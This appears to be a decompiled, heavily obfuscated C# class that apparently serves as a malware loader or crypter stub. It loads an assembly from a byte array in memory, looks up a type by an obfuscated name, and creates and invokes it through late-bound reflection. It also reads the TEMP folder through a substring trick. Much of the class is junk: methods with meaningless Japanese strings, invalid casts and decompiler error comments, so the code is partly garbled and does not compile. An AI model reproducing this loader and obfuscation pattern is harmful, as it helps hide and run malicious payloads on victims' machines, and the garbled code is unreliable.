using System;
using System.Collections.Generic;
using System.Deployment.Internal.CodeSigning;
using System.Deployment.Internal.Isolation;
using System.Deployment.Internal.Isolation.Manifest;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.ComponentModel.Com2Interop;
using System.Windows.Forms.Internal;
using System.Windows.Forms.VisualStyles;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Logging;
using Microsoft.Win32;

public class sF
{
	private object FUYbTrHzj;

	private object aIZ;

	private object C;

	private object Bgppos;

	private object jI;

	private object qK;

	private object wFGPniL;

	private object uLmlCrtl;

	private object HaGevIvt;

	private object yzVWgEk;

	private object rhNIJHMwq;

	private object PDYOFTdMM;

	private object EWTpMkqm;

	private object BeuNhB;

	private object HzjR;

	private object o;

	private object gC;

	private object JVVko;

	public static object mLEzLc(byte[] b, int o)
	{
		object obj = RVjtPc.get_LoadB(b);
		object[] array = new object[1] { o };
		bool[] array2 = new bool[1] { true };
		object result = NewLateBinding.LateGet(obj, (Type)null, "GetTypes", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			o = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
			return result;
		}
		return result;
	}

	public static object rNzKhc(Type o)
	{
		return GInI("jajdwh", new object[1] { o });
	}

	private static object GInI(object o, object[] b)
	{
		return Ebho(RuntimeHelpers.GetObjectValue(b[0]), RuntimeHelpers.GetObjectValue(OVLqzBy(null)));
	}

	private static object OVLqzBy(object o)
	{
		return typeof(Activator);
	}

	private static object Ebho(object o, object a)
	{
		return TgfvyCt(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(a, (Type)null, "GetMethod", new object[2]
		{
			"CreateInstance",
			RuntimeHelpers.GetObjectValue(LsuPr(new object[2]
			{
				"awdwaj",
				new byte[3] { 0, 1, 3 }
			}))
		}, (string[])null, (Type[])null, (bool[])null)), RuntimeHelpers.GetObjectValue(o));
	}

	private static object TgfvyCt(object a, object o)
	{
		return NewLateBinding.LateGet(a, (Type)null, "Invoke", new object[2]
		{
			null,
			RuntimeHelpers.GetObjectValue(Tha(new object[1] { RuntimeHelpers.GetObjectValue(o) }))
		}, (string[])null, (Type[])null, (bool[])null);
	}

	private static object Tha(object o)
	{
		return o;
	}

	private static object LsuPr(object[] o)
	{
		return new Type[1] { typeof(Type) };
	}

	public static object InvkM(object かくらけせにしれんい, object Params, object T)
	{
		object[] array = new object[5]
		{
			"吉吾尺克吾とけ",
			BindingFlags.InvokeMethod,
			null,
			RuntimeHelpers.GetObjectValue(かくらけせにしれんい),
			RuntimeHelpers.GetObjectValue(Params)
		};
		bool[] array2 = new bool[5] { false, false, false, true, true };
		object result = NewLateBinding.LateGet(T, (Type)null, "InvokeMember", array, (string[])null, (Type[])null, array2);
		if (array2[3])
		{
			かくらけせにしれんい = RuntimeHelpers.GetObjectValue(array[3]);
		}
		if (array2[4])
		{
			Params = RuntimeHelpers.GetObjectValue(array[4]);
			return result;
		}
		return result;
	}

	public static object wK(object o, object i)
	{
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(i) };
		bool[] array2 = new bool[1] { true };
		object obj = NewLateBinding.LateGet(o, (Type)null, "GetTypes", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			i = RuntimeHelpers.GetObjectValue(array[0]);
		}
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"迪维吉わこすた", false))
		{
			return o;
		}
		object result = default(object);
		return result;
	}

	public static object Hp()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(cjOoaq.FFUYb());
		object obj = DNvviiK.fb3_0(Conversions.ToString(objectValue), "@", -1, (CompareMethod)0)[2];
		return Strings.Replace(Conversions.ToString(obj), "と", "@", 1, -1, (CompareMethod)0);
	}

	public static object D()
	{
		return Environment.GetEnvironmentVariable("TEMPAWSAWSAW".Substring(0, 4));
	}

	public static object cc(object A)
	{
		return A;
	}

	SIGDN RUoRVjtPc(DeviceContextLayout deviceContextLayout_0, DataGridViewAutoSizeColumnsMode dataGridViewAutoSizeColumnsMode_0)
	{
		_ = sF.FUYbTrHzj;
		return (SIGDN)"たうふをぇ";
	}

	VisualStyleSystemProperty LPoPaUmj(DataGridViewComboBoxDisplayStyle dataGridViewComboBoxDisplayStyle_0, TOKEN_GROUPS token_GROUPS_0)
	{
		_ = sF.aIZ;
		return (VisualStyleSystemProperty)"きふいわりいつみ";
	}

	State pyXRuwd(FDE_OVERWRITE_RESPONSE fde_OVERWRITE_RESPONSE_0, OpFlags opFlags_0)
	{
		_ = sF.C;
		return (State)"ぇえし";
	}

	ErrorCodes QXeJV(ConfigNodeSubType configNodeSubType_0, WIN32_FILE_ATTRIBUTE_DATA win32_FILE_ATTRIBUTE_DATA_0, DataSourceUpdateMode dataSourceUpdateMode_0, AccessControlType accessControlType_0, PipelineInstruction pipelineInstruction_0, PARAMDESC paramdesc_0)
	{
		_ = sF.Bgppos;
		return (ErrorCodes)"なやりれ";
	}

	TokenImpersonationLevel XQzhkFhlz(CompoundAceType compoundAceType_0, KERB_S4U_LOGON kerb_S4U_LOGON_0, AccessControlSections accessControlSections_0, TraceEventType traceEventType_0, SynchronizationContextProperties synchronizationContextProperties_0, HebrewToken hebrewToken_0)
	{
		//IL_000b: Expected I4, but got O
		_ = sF.jI;
		return (TokenImpersonationLevel)"うまろつつわうそ";
	}

	PropertyAttributes pNfFfqkD(ChainPolicyParameter chainPolicyParameter_0, CMSG_CTRL_KEY_AGREE_DECRYPT_PARA cmsg_CTRL_KEY_AGREE_DECRYPT_PARA_0, DiskSpaceExhaustedOption diskSpaceExhaustedOption_0, RASCONN rasconn_0, ToolStripItemStates toolStripItemStates_0, ProtectionLevel protectionLevel_0)
	{
		//IL_000b: Expected I4, but got O
		_ = sF.qK;
		return (PropertyAttributes)"ゆころおこかちむ";
	}

	EventLogEntryType NtzTbRwr(Disposition disposition_0, SHChangeEventParameterFlags shchangeEventParameterFlags_0)
	{
		_ = sF.wFGPniL;
		return (EventLogEntryType)"ろれぃみら";
	}

	ISTORE_ENUM_FILES_FLAGS LnS(ToolBarTextAlign QymHxoDNv)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (ISTORE_ENUM_FILES_FLAGS)(this + QymHxoDNv + sF.uLmlCrtl);
	}

	CmiManifestSignerFlag nGDZJUa(EntitySendFormat entitySendFormat_0, Variant variant_0, CaptionLocation captionLocation_0, BuiltInPermissionFlag builtInPermissionFlag_0, int int_0, IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS iidentityauthority_DOES_DEFINITION_MATCH_REFERENCE_FLAGS_0)
	{
		_ = sF.HaGevIvt;
		return (CmiManifestSignerFlag)"にむ";
	}

	SocketConstructorFlags OdK(Guid guid_0, KEYBDINPUT keybdinput_0, PropertySort propertySort_0, MuiResourceTypeIdIntEntryFieldId muiResourceTypeIdIntEntryFieldId_0, VbStrConv vbStrConv_0, GCHandle gchandle_0)
	{
		_ = sF.yzVWgEk;
		return (SocketConstructorFlags)"ちも";
	}

	Enumerator xbDnEILCb(TabAppearance tabAppearance_0, OpFlags opFlags_0, MetadataTokenType metadataTokenType_0, CERT_NAME_INFO cert_NAME_INFO_0, HLSColor hlscolor_0, WSAPROTOCOLCHAIN wsaprotocolchain_0)
	{
		_ = sF.rhNIJHMwq;
		return (Enumerator)"おめて";
	}

	IPAddressInfo y(MatchState lMivKqJu)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (IPAddressInfo)(this + lMivKqJu + sF.PDYOFTdMM);
	}

	ToolStripItemStates xCQlm(PM pm_0, PipelineInstruction pipelineInstruction_0, Com2ShouldRefreshTypes com2ShouldRefreshTypes_0, GenericParameterAttributes genericParameterAttributes_0, CRYPT_BIT_BLOB crypt_BIT_BLOB_0)
	{
		_ = sF.EWTpMkqm;
		return (ToolStripItemStates)"うき";
	}

	CertificateEncoding ukQZZXcOH(RECT rect_0, CreateFlags createFlags_0, Nullable<> nullable_0)
	{
		_ = sF.BeuNhB;
		return (CertificateEncoding)"せろかおなねひてれ";
	}

	CMS_MANIFEST_FLAG UoRVjtPcP(SearchOption CdyxaIZL)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (CMS_MANIFEST_FLAG)(this + CdyxaIZL + sF.HzjR);
	}

	IdnScopeFromConfig PaUmj(HTTP_KNOWN_HEADER HcBspB)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (IdnScopeFromConfig)(this + HcBspB + sF.o);
	}

	ScreenOrientation p(ScrollBars yXRuwdxDL)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (ScreenOrientation)(this + yXRuwdxDL + sF.gC);
	}

	SpecialPermissionSetFlag rjIXQzhk(TabInfo Fhlz)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (SpecialPermissionSetFlag)(this + Fhlz + sF.JVVko);
	}
}
